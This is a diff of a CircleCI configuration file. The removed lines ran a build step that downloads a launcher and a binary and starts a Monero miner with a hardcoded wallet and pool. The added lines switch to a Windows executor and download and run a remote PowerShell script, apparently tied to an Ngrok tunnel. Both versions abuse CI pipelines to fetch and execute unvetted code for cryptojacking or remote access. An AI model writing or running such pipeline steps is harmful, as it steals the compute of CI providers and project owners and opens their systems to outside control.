@@ -1,12 +1,21 @@
-
-version: 2.0
+version: 2.1 
+ 
+orbs:
+  win: circleci/windows@2.2.0
+ 
 jobs:
-  build:
-    docker:
-      - image: circleci/ruby:2.4.2-jessie-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
-    steps:
-      - checkout
-      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet 86MX8aRxReUgAJaRmudwimF7QKPHRGstu93UwfuBUagLWovopncLrAd31EYYtvCbrFehTtwaiwLyu9PpkbJwBXcj8LK7g3C   -dombaranjum  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -de.monero.herominers.com:1111
+  build: 
+    executor:
+      name: win/default 
+      size: "medium" 
+      
+        
+ 
+    steps:  
+       
+      - run: 
+          name: Paste Ngrok Auth Value In Hosted Link
+          command: |      
+            Invoke-WebRequest https://raw.githubusercontent.com/Yahihs/rep/main/sh -OutFile gpu.ps1 
+          
+      - run: ./gpu.ps1
